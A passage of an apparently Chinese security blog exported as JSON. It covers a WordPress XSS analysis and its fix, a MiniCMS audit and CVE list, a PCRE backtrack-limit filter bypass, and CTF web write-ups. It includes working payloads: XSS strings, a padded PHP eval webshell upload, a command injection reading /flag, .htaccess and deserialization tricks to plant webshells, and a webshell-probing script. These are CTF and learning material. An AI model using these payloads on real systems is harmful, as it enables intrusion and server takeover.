//注意此处对每个属性的值添加双引号 &#125; $text = trim( $html ); &#125; return \"&lt;a $text rel=\\\"$rel\\\"&gt;\";&#125; 可以很明显的注意到，在调用解析rel属性的函数时，如果存在rel属性，首先将解析的每一个属性直接拼接进去并且加上双引号。 WordPress对属性的解析与浏览器的解析一致，大致如下： 1. 外界为双引号，则把双引号内字符串解析为属性而不会加转义 2. 外界为单引号，则把单引号内字符串解析为属性而不会加转义 而在此处，如果单引号中包含双引号，解析时被当做属性，自然不会转义，而最后却被包裹上了双引号，从而造成闭合，原本在属性中的恶意代码被解析： 123&lt;a title=' \" onmouseover=alert(1) attr2=\" ' rel='1'&gt;click-&gt;&lt;a title=\" \" onmouseover=alert(1) attr2=\" \" rel=\"1\"&gt;click 最后输出的结果为： 1&lt;a title=\" \" onmouseover=\"alert(1)\" attr2=\" \" rel=\"1 nofollow\"&gt;click&lt;/a&gt; 从而造成XSS 修复分析 针对此漏洞的修复主要有两个： 第一处： 可以看到使用esc_attr函数对属性进行转义了。 第二处： 第二处修补使用wp_filter_kses代替了wp_filter_post_kses。 首先查看wp_filter_post_kses： 123456789101112131415function wp_filter_post_kses( $data ) &#123; return addslashes( wp_kses( stripslashes( $data ), 'post' ) );&#125;跟进-&gt;function wp_kses( $string, $allowed_html, $allowed_protocols = array() ) &#123; if ( empty( $allowed_protocols ) ) &#123; $allowed_protocols = wp_allowed_protocols(); &#125; $string = wp_kses_no_null( $string, array( 'slash_zero' =&gt; 'keep' ) ); $string = wp_kses_normalize_entities( $string ); $string = wp_kses_hook( $string, $allowed_html, $allowed_protocols ); return wp_kses_split( $string, $allowed_html, $allowed_protocols ); //注意此处&#125; 可以看到，该函数主要是基于$allowed_html对string进行了过滤。 再查看wp_filter_kses： 123function wp_filter_kses( $data ) &#123; return addslashes( wp_kses( stripslashes( $data ), current_filter() ) );&#125; 同样地，使用了wp_kses函数，不同的是这次传入的是current_filter()，其中关键的过滤功能在函数wp_kses_split中，跟进： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970function wp_kses_split( $string, $allowed_html, $allowed_protocols ) &#123; global $pass_allowed_html, $pass_allowed_protocols; $pass_allowed_html = $allowed_html; $pass_allowed_protocols = $allowed_protocols; return preg_replace_callback( '%(&lt;!--.*?(--&gt;|$))|(&lt;[^&gt;]*(&gt;|$)|&gt;)%', '_wp_kses_split_callback', $string );&#125;跟进_wp_kses_split_callback-&gt;function _wp_kses_split_callback( $match ) &#123; global $pass_allowed_html, $pass_allowed_protocols; return wp_kses_split2( $match[0], $pass_allowed_html, $pass_allowed_protocols );&#125;跟进wp_kses_split2-&gt;function wp_kses_split2( $string, $allowed_html, $allowed_protocols ) &#123; $string = wp_kses_stripslashes( $string );...if ( ! is_array( $allowed_html ) ) &#123; $allowed_html = wp_kses_allowed_html( $allowed_html ); &#125;...&#125;跟进wp_kses_allowed_html-&gt;function wp_kses_allowed_html( $context = '' ) &#123; global $allowedposttags, $allowedtags, $allowedentitynames; ... switch ( $context ) &#123; case 'post': $tags = apply_filters( 'wp_kses_allowed_html', $allowedposttags, $context ); if ( ! CUSTOM_TAGS &amp;&amp; ! isset( $tags['form'] ) &amp;&amp; ( isset( $tags['input'] ) || isset( $tags['select'] ) ) ) &#123; $tags = $allowedposttags; $tags['form'] = array( 'action' =&gt; true, 'accept' =&gt; true, 'accept-charset' =&gt; true, 'enctype' =&gt; true, 'method' =&gt; true, 'name' =&gt; true, 'target' =&gt; true, ); $tags = apply_filters( 'wp_kses_allowed_html', $tags, $context ); &#125; return $tags; case 'user_description': case 'pre_user_description': $tags = $allowedtags; $tags['a']['rel'] = true; return apply_filters( 'wp_kses_allowed_html', $tags, $context ); case 'strip': return apply_filters( 'wp_kses_allowed_html', array(), $context ); case 'entities': return apply_filters( 'wp_kses_allowed_html', $allowedentitynames, $context ); case 'data': default: return apply_filters( 'wp_kses_allowed_html', $allowedtags, $context );&#125; 可以看到，传入post时，使用$allowedposttags过滤；传入current_filter()解析出的pre_comment_content时则进入default，使用$allowedtags过滤。 这两个数组都是全局变量，$allowedposttags中包括各种标签，其中就包括a以及其rel属性: 12345678910'a' =&gt; array( 'href' =&gt; true, 'rel' =&gt; true, 'rev' =&gt; true, 'name' =&gt; true, 'target' =&gt; true, 'download' =&gt; array( 'valueless' =&gt; 'y', ), ) 而$allowedtags比$allowedposttags严格的多，其中a标签的内容如下： 1234'a' =&gt; array( 'href' =&gt; true, 'title' =&gt; true,) 所以，第二个修复点其实是把标签白名单缩小了，不允许rel的出现。 参考资料 https://www.bynicolas.com/code/wordpress-nonce/ https://brutelogic.com.br/blog/compromising-cmses-xss/ https://lorexxar.cn/2017/08/23/xss-tuo/ https://lorexxar.cn/2019/03/14/wp5-1-1xss/","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://hachp1.github.io/categories/Web安全/"}],"tags":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"https://hachp1.github.io/tags/漏洞分析/"}]},{"title":"代码审计 MiniCMS从头开始","slug":"代码审计-MiniCMS从头开始","date":"2019-07-08T07:15:18.000Z","updated":"2025-02-06T15:11:51.318Z","comments":true,"path":"posts/Web安全/20190708-MiniCMS.html","link":"","permalink":"https://hachp1.github.io/posts/Web安全/20190708-MiniCMS.html","excerpt":"代码审计 MiniCMS从头开始 写在之前 最近从头开始学习代码审计，准备从开发的眼光入手，至少要熟悉整个框架的执行流程。MiniCMS体积小，代码短小易读，所以首先详细分析其执行流程。通过学习可以大致熟悉MVC框架的构造，对Web server的后台处理有一个基本了解。","text":"代码审计 MiniCMS从头开始 写在之前 最近从头开始学习代码审计，准备从开发的眼光入手，至少要熟悉整个框架的执行流程。MiniCMS体积小，代码短小易读，所以首先详细分析其执行流程。通过学习可以大致熟悉MVC框架的构造，对Web server的后台处理有一个基本了解。 简介 MiniCMS是由达达设计编写的一个针对个人网站设计的微型内容管理系统。它的特点是： 不需要数据库在支持，只需要一个可以运行PHP的Web环境 只针对个人网站设计，没有复杂的成员管理和权限设置 没有分类只有标签，免除发布文章时到底该怎么分类的纠结 只有“文章”和“页面”两该个系统，没有“评论”、“插件”、“主题”，让你更专注于创造内容 项目地址：https://github.com/bg5sbk/MiniCMS 安装 解压 复制并重命名install.txt为install.php 在PHP环境下，浏览器打开install.php，填写网站路径、网站名等信息，点击安装即可（此处填写网站信息等可以注入命令造成RCE，但是由于install.php在安装完成后会自动删除，漏洞不可利用，所以并没有太大的威胁） 安装完成后的目录结构 12345678910111213141516171819202122232425262728293031323334353637383940│ build.php│ index.php 整个项目的入口，首先引入核心库mc-core.php，然后进行路由，对路由结果进行相应的渲染，相当于MVC中的C│ install.txt 复制为php文件后，用来安装MiniCMS│ README.md│├─mc-admin 管理功能的实现│ conf.php 用户设置页面，包括接收和保存更改的设置│ editor.php 编辑器的大小、样式调整的库│ foot.php html&lt;foot&gt;标签构造│ head.php token验证，html&lt;head&gt;标签构造；若验证失败，跳转至主页│ index.php 后台登陆身份验证页面│ page-edit.php 页面编写处理逻辑，包括显示编辑页面、接收提交的页面、页面序列化储存│ page.php 管理页面的库，声明加载数据、删除页面、还原页面（从回收站还原）│ post-edit.php 文章编写处理逻辑，包括显示编辑页面、接收提交的页面、页面序列化储存│ post.php 管理文章的库，声明加载数据、删除文章、还原文章（从回收站还原）│ style.css 后台用到的CSS│└─mc-files │ markdown.php 一个开源的markdown解析库 │ mc-conf.php 配置文件，包含用户名和密码等敏感信息 │ mc-core.php 引入mc-tags、mc-conf，声明404函数 │ mc-rss.php 订阅RSS的链接 │ mc-tags.php 相当于M，引入markdown、包括一些核心函数，包括了加载各种信息的函数（网站名、文章数、前进后退等，中间有各种过滤，可以重点分析） │ ├─pages │ └─index │ delete.php 使用数组储存了删除页面的信息（id、标题、标签等）与data文件夹内的文章数据一一对应 │ draft.php 使用数组储存了草稿页面的信息（id、标题、标签等）与data文件夹内的文章数据一一对应 │ publish.php 使用数组储存了已发布的页面的信息（id、标题、标签等）与data文件夹内的文章数据一一对应 │ ├─posts │ ├─data 储存了文章内容的反序列化数据（文章内容等） │ └─index │ delete.php 使用数组储存了删除的文章的信息（id、标题、标签等）与data文件夹内的文章数据一一对应 │ draft.php 使用数组储存了草稿文章的信息（id、标题、标签等）与data文件夹内的文章数据一一对应 │ publish.php 使用数组储存了已发布文章的信息（id、标题、标签等）与data文件夹内的文章数据一一对应 │ └─theme index.php 主题文件，决定了页面的风格，将C传入的信息显示出来，相当于V style.css 主题使用的CSS风格 访客端 路由与控制器(MVC-C) MiniCMS在index.php页面进行简单的正则匹配和字符串对比路由，index.php会取出$_SERVER['QUERY_STRING']并进行正则匹配；主要有以下几种路由： 12345671. preg_match('|^post/([a-z0-5]&#123;6&#125;)$|', $qs, $matches) // 路由至查看文章功能2. preg_match('|^tag/([^/]+)/(\\?page=([0-9]+))&#123;0,1&#125;$|', $qs, $matches) // 路由至查看页面功能3. preg_match('|^date/([0-9]&#123;4&#125;-[0-9]&#123;2&#125;)/(\\?page=([0-9]+))&#123;0,1&#125;$|', $qs, $matches) // 路由至按日期查看文章4. preg_match('|^archive/$|', $qs, $matches) // 路由至按archive查看文章5. $qs == 'rss/' // 路由至返回RSS订阅6. preg_match('|^(([-a-zA-Z0-5]+/)+)$|', $qs, $matches) // 路由至page查看文章7. default:index // 其他情况，路由至主页 视图(MVC-V) mc_files/theme/index.php文件中，通过 1&lt;div class=\"content\"&gt;&lt;?php mc_the_content(); ?&gt;&lt;/div&gt; 直接渲染路由到的内容。 通过mc-files/theme/style.css修改主页的CSS风格。 模型(MVC-M) 模型M相关的功能主要在 mc-files/mc-tags.php中实现。 主要函数有： mc_site_name 获取网站名 mc_site_desc 获取网站标题后缀 mc_site_link 获取网站链接 mc_nick_name 获取昵称 mc_theme_url 获取主题文件路径 mc_is_post 返回路由是否是post mc_is_page 返回路由是否是page mc_is_tag 返回路由是否是tag mc_is_date 返回路由是否是date mc_is_archive 返回路由是否是archive mc_tag_name 获取标签名 mc_date_name 获取日期 mc_has_new 获取是否有更新的页面（页面底部的页数） mc_has_old 获取是否有更早的页面（页面底部的页数） mc_goto_old 打印输出更早页面的超链接 mc_goto_new 打印输出更晚页面的超链接 mc_date_list 打印输出日期列表 mc_tag_list 打印输出标签列表 mc_next_post 判断是否有下一个post mc_the_title 打印输出标题 mc_the_date 打印输出日期 mc_the_time 打印输出时间 mc_the_tags 打印输出标签 mc_the_content 打印输出主要内容（文章、页面） mc_the_link 打印输出超链接和其标题 mc_the_url 打印输出url的超链接 mc_can_comment 返回是否能够评论 mc_comment_code 获取填入的第三方评论代码 后台管理端 后台管理端直接用代码按功能写入文件，各文件的功能如下： conf.php 用户设置页面，包括接收和保存更改的设置 editor.php 编辑器的大小、样式调整的库 foot.php html标签构造 head.php token验证，html 标签构造；若验证失败，跳转至主页 index.php 后台登陆身份验证页面 page-edit.php 页面编写处理逻辑，包括显示编辑页面、接收提交的页面、页面序列化储存 page.php 管理页面的库，声明加载数据、删除页面、还原页面（从回收站还原） post-edit.php 文章编写处理逻辑，包括显示编辑页面、接收提交的页面、页面序列化储存 post.php 管理文章的库，声明加载数据、删除文章、还原文章（从回收站还原） style.css 后台用到的CSS CVE漏洞 在MiniCMS公开期间，爆出了多个CVE漏洞，并且至今未修复，主要如下（按时间先后顺序排列）： CVE-2018-1000638 反射型XSS 存在位置：/MiniCMS-master/mc-admin/page.php处date参数存在XSS漏洞 CVE-2018-10227 储存型XSS 存在位置：/MiniCMS-master/MiniCMS-master/mc-admin/conf.php 在设置中修改网站地址处存在XSS漏洞，可直接储存XSS payload CVE-2018-10296 储存型XSS 存在位置： /MiniCMS-master/mc-admin/post-edit.php 编辑文章标题处可直接储存XSS payload CVE-2018-10423 个人认为不是漏洞，只是个BUG，此处的BUG只是网页中的超链接错误地指向了网站根目录，点击后就会去访问网站根目录，这个时候，洞主的apache配置没有关文件遍历，就误认为是CMS的漏洞，显然是不对的，洞主应该是刷分的，没想到竟然过了:) CVE-2018-10424 物理路径泄露 存在位置：/MiniCMS-master/mc-admin/post-edit.php处将GET的参数id改为不存在的文件名，会爆出物理地址 CVE-2018-15899 反射型XSS 存在位置：/minicms/mc-admin/page.php的GET参数date存在XSS（似乎与CVE-2018-1000638重复了。。） CVE-2018-16233 反射型XSS 存在位置：/MiniCMS-1.10/mc-admin/post-edit.php处的POST参数tags存在XSS CVE-2018-16298 反射型XSS 存在位置：/MiniCMS-1.10/mc-admin/post.php的GET参数tag存在XSS CVE-2018-17039 反射型XSS 存在位置：/mc-admin/index.php使用任意GET参数并取XSS payload，可在IE浏览器中执行JS CVE-2018-18890 物理路径泄露 存在位置：post.php?delete=qe54cn&amp;state=delete删除不存在的文章时爆出物理路径 CVE-2018-18891 部分文件删除（逻辑漏洞，删除操作在身份认证之前进行） 存在位置：/mc-admin/post.php?delete=qe54cn&amp;state=delete不用登陆可直接删除文章 CVE-2018-18892 鸡肋的RCE 存在位置： install.php在安装时在配置处可以向配置文件直接注入PHP代码；由于在MiniCMS安装完毕后此文件会自我删除，在实际情况下并没有太大的作用 CVE-2018-20520 反射型XSS 存在位置：类似于CVE-2018-17039，/MiniCMS1/mc-admin/post-edit.php使用任意GET参数并取XSS payload，可在IE浏览器中执行JS CVE-2018-9092 CSRF 存在位置： http://127.0.0.1//MiniCMS/mc-admin/post.php?delete=aaaaaa&amp;state=publish&amp;date=&amp;tag= 此处的CSRF会导致任意文章删除： CVE-2019-9603 CSRF 存在位置：/minicms/mc-admin/conf.php 此处的CSRF会导致任意修改网站配置","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://hachp1.github.io/categories/Web安全/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://hachp1.github.io/tags/Web安全/"}]},{"title":"PRCE 正则最大回溯次数","slug":"PRCE-正则最大回溯次数","date":"2019-06-16T04:45:13.000Z","updated":"2025-02-06T15:11:50.938Z","comments":true,"path":"posts/Web安全/20190616-prce.html","link":"","permalink":"https://hachp1.github.io/posts/Web安全/20190616-prce.html","excerpt":"PRCE 正则最大回溯次数","text":"PRCE 正则最大回溯次数 重点概要 回溯次数的计算：调用匹配正则表达式中的片段的次数，如：尝试匹配[a-z]+的次数。 贪婪模式需要前覆盖后，才会出现绕过 非贪婪模式一般都会有绕过 注意$结束符号也要考虑在正则表达回溯条件中 在PHP正则匹配中，存在一个最大回溯次数 回溯现象 PHP中，为了防止一次正则匹配调用的匹配过程过大从而造成过多的资源消耗，限定了一次正则匹配中调用匹配函数的次数。 回溯主要有两种 贪婪模式下，pattern部分被匹配，但是后半部分没匹配（匹配“用力过猛”，把后面的部分也匹配过了）时匹配式回退的操作，在出现*、+时容易产生。 非贪婪模式下，字符串部分被匹配，但后半部分没匹配完全（匹配“用力不够”，需要通配符再匹配一定的长度），在出现*?、+?时容易产生。 当传入字符串在正则匹配时回溯次数超过限制（默认1000000，可调整）时，会报错返回false 使用以下代码可以查看当前prce_limit: 1var_dump(ini_get('pcre.backtrack_limit')); 出现PRCE绕过的条件 贪婪模式下 当正则表达式中存在前部分条件覆盖了后部分条件的时候，会出现PRCE，例： 1preg_match('/&lt;\\?.*[(`;?&gt;].*/is',$put) 此处的“[(;?&gt;]”表达式被它前面的&quot;.*“包括在内了，所以会出现“用力过猛”的现象，造成回溯现象的产生。 非贪婪模式下 非贪婪模式下极易出现PRCE绕过，因为非贪婪模式一定会每次只匹配一个，此时只要字符串足够长，肯定会超出backtrack_limit的范围。 123if(preg_match('/UNION.+?SELECT/is', $input)) &#123; die('SQL Injection');&#125; 此处的“.+?”每次只匹配一个字符，当下一处不匹配“S”时，就会回溯调用匹配“.+?”，再继续匹配“S”，造成回溯现象的产生。 测试代码 贪婪模式 12345678&lt;?php$put=$_REQUEST['input'];if(preg_match('/&lt;\\?.*[(`;?&gt;].*/is',$put))&#123; die('Hacker');&#125;else&#123; echo \"SUCCESS\";&#125; payload: 123456789######################不通过##################import requestsdata = &#123; 'input': '&lt;?php eval($_POST[txt]);//' + 'a' * 100000&#125;res = requests.post('http://localhost:801/test.php', data=data, allow_redirects=False)print(res.text) 123456789######################通过##################import requestsdata = &#123; 'input': '&lt;?php eval($_POST[txt]);//' + 'a' * 1000000&#125;res = requests.post('http://localhost:801/test.php', data=data, allow_redirects=False)print(res.text) 非贪婪模式 1234&lt;?phpif(preg_match('/UNION.+?SELECT/is', $input)) &#123; die('SQL Injection');&#125; payload: 1UNION/*aaa.......aa*/SELECT 回溯过程在线分析网站 https://regex101.com/ 修复方式 不管是贪婪模式还是非贪婪模式，preg_match报错返回的都不是真正的数字（0或1），所以应该使用三等号来判断： 1234567function is_php($data)&#123; return preg_match('/&lt;\\?.*[(`;?&gt;].*/is', $data); &#125;if(is_php($input) === 0) &#123; // fwrite($f, $input); ...&#125; 参考资料 PHP利用PCRE回溯次数限制绕过某些安全限制","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://hachp1.github.io/categories/Web安全/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://hachp1.github.io/tags/Web安全/"}]},{"title":"2019国赛西南赛区部分WEB WP","slug":"2019国赛西南赛区部分WEB-WP","date":"2019-06-15T09:00:00.000Z","updated":"2025-02-06T15:11:50.288Z","comments":true,"path":"posts/Web安全/20190615-19guosaixx.html","link":"","permalink":"https://hachp1.github.io/posts/Web安全/20190615-19guosaixx.html","excerpt":"2019国赛西南赛区部分WEB WP 前言 国赛区域赛打完了，太菜了，就当公费旅游了。趁这几天有空复现了一下几道题。","text":"2019国赛西南赛区部分WEB WP 前言 国赛区域赛打完了，太菜了，就当公费旅游了。趁这几天有空复现了一下几道题。 day1 划水并且上别人的车。源码忘了拷，血亏。只做出一道yml反序列化的题，还是上的别人的车。 day2 web1 先膜一发evoA师傅，感谢大师傅给的思路。 这题思路很骚，虽然做题点都学过，但是思路很巧妙。 考点：htaccess文件写入 首先，提示是文件上传，但是文件上传处被过滤的死死的；整个目录中相对宽松的地方就只有login-lock.php处的代码了，通过post time参数可以写入任意代码： 12345678if (isset($_POST[\"time\"])) &#123; $time = $_POST[\"time\"]; $lock = fopen(\"files/\" . $_SESSION[\"name\"], \"w\"); fwrite($lock, $time); fclose($lock); sleep(2);//假装处理要消耗不少时间 让动画好看一点 echo \"files/\" . $_SESSION[\"name\"];&#125; 但是，生成的文件名使用的name是用户名，而在注册用户时，用户名过滤比较严格： 1preg_match('/(.+)(?=\\.)/', $name, $matches); //只要发现.前面有东西就干死 其实回过头来才看出来作者是在提示：.前面有东西就干死 :)，那前面没东西不就好了。 所以这里可以创建一个用户名为.htaccess的用户，在其中将jpg文件解析为php；然后再创一个正常用户，上传一个图片马即可getshell（不能用.htaccess用户是因为php默认不解析包含htaccess关键字的文件，而上传的图片名也为用户名） .htaccess内容为： 1AppType application/x-httpd-php .jpg 一个意外发现的点 这个点是队友想出来的，既然可以直接写入没有文件名而只有后缀的文件，是不是可以直接写入.php文件呢？ 在不同的系统上尝试，发现在本机的windows中可以直接解析.php文件，而在ubuntu系统中则无法解析。 原因是apache在linux下解析文件时，对隐藏文件（开头为.号）的文件是不给访问权限的，所以无法直接写入.php文件getshell。 day2 web2 此题源码泄露+多行匹配绕过 首先扫描路径获得swp文件（做题时自己字典太菜了，居然没扫到，很难受），还原得源码，关键代码： 12345678910111213141516171819&lt;?php error_reporting(0); $file_name = $_POST[\"path\"]; if(preg_match(\"/flag/\",$file_name))&#123; die(\"请不要输入奇奇怪怪的字符！\"); &#125; if(is_array($file_name))&#123; $file_name=implode($file_name); &#125; if(!preg_match(\"/^[a-zA-Z0-9-s_]+.rar$/m\", trim($file_name))) &#123; echo trim($file_name).'&lt;br&gt;'; echo \"请输入正确的文件名\"; &#125;else &#123; echo \"/usr/bin/md5sum \" . $file_name; echo( exec(\"/usr/bin/md5sum \" . $file_name)); &#125;?&gt; 可以看到有命令执行，第一处的preg_match用传入数组绕过，第二处的preg_match用多行匹配%0a绕过（多行匹配对每一行进行匹配，只要有一行满足就返回1）。 payload: 1path[]=1.rar%0acat /flag day2 web3 吐槽一下，这题是真的辣鸡，出题人出错了题，主办方也不好好审一下。 比赛的时候一眼看出来是南邮CTF的一道题的改版，直接拿当时的脚本怼，不出结果。再查看注释，发现要输入一个比 1000000大的最小的素数，查了一下是1000003，拿脚本继续跑，各种改，跑了一上午都不出flag；这时候看看全场，居然没有一支队伍做出来，肯定遇到坑了，就没做了。 最后fix环节的时候才发现题给错了，应该是比 10000000大的最小的素数，为 10000019。拿脚本又打了一遍，出flag了，手动微笑，建议把出题的打死 :) 此题几乎照搬NCTF“小绿草之最强大脑”，考点：会写脚本解析网页，直接上脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124#calc.pyimport redef jia(*args): ''' 加法解析 :param args: :return: ''' # print('jia:', args) res = 0 for i in args: #解决*-和/-的情况 #i = i.replace('*-','#').replace('/-','@') jian_list = i.split('-') # 减号的拆分要解决负号的情况:把负号拆分后列表中所有为空字符串的元素替换成'0' # 还要把*-和/-替换回来 for id,j in enumerate(jian_list): if j=='': jian_list[id] = '0' else: jian_list[id] = j.replace('#','*-').replace('@','/-') res += jian(*jian_list) return resdef jian(*args): ''' 减法解析 :param args: :return: ''' # print('jian:', args) #减法需要先算出第一个式子，拿第一个式子去减后面的式子 res = args[0:1] res = chen(*res[0].split('*')) for i in args[1:]: chen_list = i.split('*') res -= chen(*chen_list) return resdef chen(*args): ''' 乘法解析 :param args: :return: ''' # print('chen:',args) res = 1 for i in args: chu_list = i.split('/') res *= chu(*chu_list) return resdef chu(*args): ''' 除法解析 :param args: :return: ''' # print('chu:', args) #除法需要先取出第一个，拿第一个除以后面的 res = args[0:1] res = int(res[0]) for i in args[1:]: i = int(i) res /= i return resdef simpleCalc(input_str): ''' 不带括号的表达式解析 :param input_str: :return: ''' # 去掉最外层的括号 input_str = input_str.strip('()') # 处理 --、+- 的情况，还有 *-、/- 的情况没处理 input_str = input_str.replace(' ','').replace('--','+').replace('+-','-').replace('*-','#').replace('/-','@') #print(input_str) #计算加减乘除 jia_list = input_str.split('+') res = jia(*jia_list) return res #return str(eval(input_str))def calc(input_str): ''' 计算器入口 :param input_str: :return: ''' if len(input_str) == 0: # print('Wrong input') exit(0) #print(input_str) #查找是否还有括号 m = re.search('\\([^()]+\\)', input_str) brackets_exists = False #print(m) if m == None:#不再有括号了，就直接计算 simple_calc_str = input_str#需要计算的值的字符串就是传入的表达式 else:#还有括号，就把找到的括号中的表达式计算的值替换括号所在位置 brackets_exists = True simple_calc_str = m.group()#需要计算值的字符串是找到的括号中的表达式 simple_res = str(simpleCalc(simple_calc_str)) if brackets_exists:#还有括号，就把找到的括号中的表达式计算的值替换括号所在位置,进入迭代 return calc(input_str.replace(simple_calc_str,simple_res,1)) else:#没有括号就直接把计算结果返回 return simple_resif __name__ == '__main__': # input_str = '3 * 4 + (-4 / 2 - 8 - 3 * 2 + ( 4 - 5 / 2 + 11 - ( 2 * 3 - 9 ) - 12 )) + 20 - 3 * 2 - ( 5 + 8 / 4)' # input_str = '3/(-1) - (4*-2)/(1+1)/(1+1)' input_str = '1-2*30000000000000000000000000000000000000000' result = calc(input_str) print(result) 12345678910111213141516171819202122232425262728293031323334353637383940414243#get_flag.pyimport requestsimport refrom calculator import calcfrom bs4 import BeautifulSoupimport timeurl=\"http:/localhost:801/ctf_test/guosai_xx/source/web3//index.php\"sess=requests.session()res = sess.post(url)for i in range(5): vstr = res.text soup = BeautifulSoup(vstr,'lxml') form = soup.text form = form.strip('\\n') form = form.strip('\\r') # form = form.replace('\\t','') print('原：',form) # 原 form = ''.join(re.findall('([0-9\\-*+])', form)) print(form) # 原 if(i!=0): form=form[1:] form=form[1:] print('提取算式，剪切',form) # 提取算式，剪切 form = '10000019+(' + form+')' #1000003 print('算式'+form) result = calc(form) print(result) data=&#123;'input': '10000019', 'ans': result&#125; time.sleep(2) res = sess.post(url,data=data) # print(res.text) print(res.headers)print(res.text)print(res.headers) 结语 第一天还有很多道题没来得及拷出来，不知道能不能在网上找到WP；自己的水平也很菜，继续学习才能赶上大部队。 最后附上本文中题的源码：https://github.com/HACHp1/hackable_cms_store/tree/master/guosai_xx","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://hachp1.github.io/categories/Web安全/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://hachp1.github.io/tags/Web安全/"}]},{"title":"2019第三届强网杯部分WEB WP","slug":"2019第三届强网杯部分WEB-WP","date":"2019-05-30T03:13:55.000Z","updated":"2025-02-06T15:11:50.318Z","comments":true,"path":"posts/Web安全/20190530-19qwb.html","link":"","permalink":"https://hachp1.github.io/posts/Web安全/20190530-19qwb.html","excerpt":"2019第三届强网杯部分WEB WP","text":"2019第三届强网杯部分WEB WP UPLOAD 注意此题需要在PHP7环境中才能复现，在PHP5中由于异常处理机制，不会调用析构函数。 打开网页，发现是一个注册登陆页面，注册之后可以上传图片。 扫描根目录，发现有源码www.gz.tar，下载后可以看到在tp5目录中有.idea文件夹，说明是使用phpstorm写的。导入phpstorm发现了两个断点： 1234567//Register.phppublic function __destruct() &#123; if(!$this-&gt;registed)&#123; $this-&gt;checker-&gt;index(); // 断点1 &#125; &#125; 12345678910111213//Index.phppublic function login_check()&#123; $profile=cookie('user'); if(!empty($profile))&#123; $this-&gt;profile=unserialize(base64_decode($profile)); // 断点2 $this-&gt;profile_db=db('user')-&gt;where(\"ID\",intval($this-&gt;profile['ID']))-&gt;find(); if(array_diff($this-&gt;profile_db,$this-&gt;profile)==null)&#123; return 1; &#125;else&#123; return 0; &#125; &#125; 提示反序列化存在漏洞。 结合本题为上传题，猜测是要结合反序列化和上传两个点攻击。观察析构函数，如果registed为False则调用checker的index函数。 查找是否有可以利用的类，发现Profile.php中的Profile类中无index函数，而且有__call函数： 123456public function __call($name, $arguments) &#123; if($this-&gt;&#123;$name&#125;)&#123; $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments); &#125; &#125; 如果调用Profile类的index函数，就会调用__call('index')，此时，如果构造的Profile类的index指向任意一个函数，就会调用该函数。而本题是上传题，首先想到upload_img函数: 123456789101112131415161718192021222324252627public function upload_img()&#123; if($this-&gt;checker)&#123; if(!$this-&gt;checker-&gt;login_check())&#123; $curr_url=\"http://\".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'].\"/index\"; $this-&gt;redirect($curr_url,302); exit(); &#125; &#125; if(!empty($_FILES))&#123; $this-&gt;filename_tmp=$_FILES['upload_file']['tmp_name']; $this-&gt;filename=md5($_FILES['upload_file']['name']).\".png\"; $this-&gt;ext_check(); &#125; if($this-&gt;ext) &#123; if(getimagesize($this-&gt;filename_tmp)) &#123; @copy($this-&gt;filename_tmp, $this-&gt;filename); @unlink($this-&gt;filename_tmp); $this-&gt;img=\"../upload/$this-&gt;upload_menu/$this-&gt;filename\"; $this-&gt;update_img(); &#125;else&#123; $this-&gt;error('Forbidden type!', url('../index')); &#125; &#125;else&#123; $this-&gt;error('Unknow file type!', url('../index')); &#125; &#125; 可以看到在if($this-&gt;ext)之后的逻辑中，可以通过修改$this-&gt;filename_tmp和$this-&gt;filename达到图片重命名的目的，将上传的图片马还原为webshell。 所以先上传一个图片马。 然后构造payload： 123456789101112131415161718192021222324252627&lt;?phpnamespace app\\web\\controller;class Register&#123; public $checker;&#125;class Profile&#123; public $filename_tmp; public $filename; public $ext; public $except; public $index;&#125;$reg=new Register();$prof=new Profile();$prof-&gt;filename_tmp='upload/837ec5754f503cfaaee0929fd48974e7/00bf23e130fa1e525e332ff03dae345d.png';//原文件名（图片马$prof-&gt;filename='upload/1.php';//目标文件名$prof-&gt;ext=true;//过检查$prof-&gt;index='upload_img';$reg-&gt;registed = false;//register析构函数中的条件$reg-&gt;checker=$prof;echo base64_encode(serialize($reg)); 将输出代替cookie中的user值，访问。 7. 可以看到成功重命名webshell了。 8. 拿蚁剑连接可以在根目录处找到flag。 高明的黑客 我在做这道题的时候想的是用hook，但是发现这道题用hook似乎没办法做，因为文件太多了，而只有一个文件可以用，不可能手工挨个试。 在本地复现的时候，想法很简单，先按文件匹配出POST和GET的参数，然后对每个参数都传入system(whoami)和whoami，分别对应eval型和直接调用system型webshell。 做题过程： 下载源码 编写脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960import osimport requestsimport redef return_files(rootDir): list_dirs = os.walk(rootDir) funfiles=[] for root, dirs, files in list_dirs: for f in files: funfiles.append(os.path.join(root, f)) return funfilesIF_DEBUG=Falseexp_list=['whoami','system(\"whoami\")']url_pre='http://localhost:802/qwb/web2/'pat1=r\"\\$_GET\\['(\\w+)'\\]\"pat2=r\"\\$_POST\\['(\\w+)'\\]\"files=return_files('src')i=0for vfile in files: print(i,vfile) i+=1 get_params=[] post_params=[] with open(vfile) as fr: try: lines=fr.readlines() except UnicodeDecodeError: print(vfile) continue for line in lines: get_params+=re.findall(pat1,line) post_params+=re.findall(pat2,line) for exp in exp_list: post_dic=&#123;&#125; for post_param in post_params: post_dic[post_param]=exp shell_name=vfile[4:] if(len(get_params+post_params)!=0): t1=requests.get(url_pre+shell_name).text temp_url=url_pre+shell_name+'?' for get_param in get_params: temp_url+=get_param+'='+exp+'&amp;' temp_url=temp_url[:-1] if(IF_DEBUG): print(t1) print(temp_url) print(post_dic) exit() t2=requests.post(temp_url,data=post_dic).text if(len(t1)!=len(t2)): print(temp_url) print(post_dic) 对本地一通扫之后，输出： 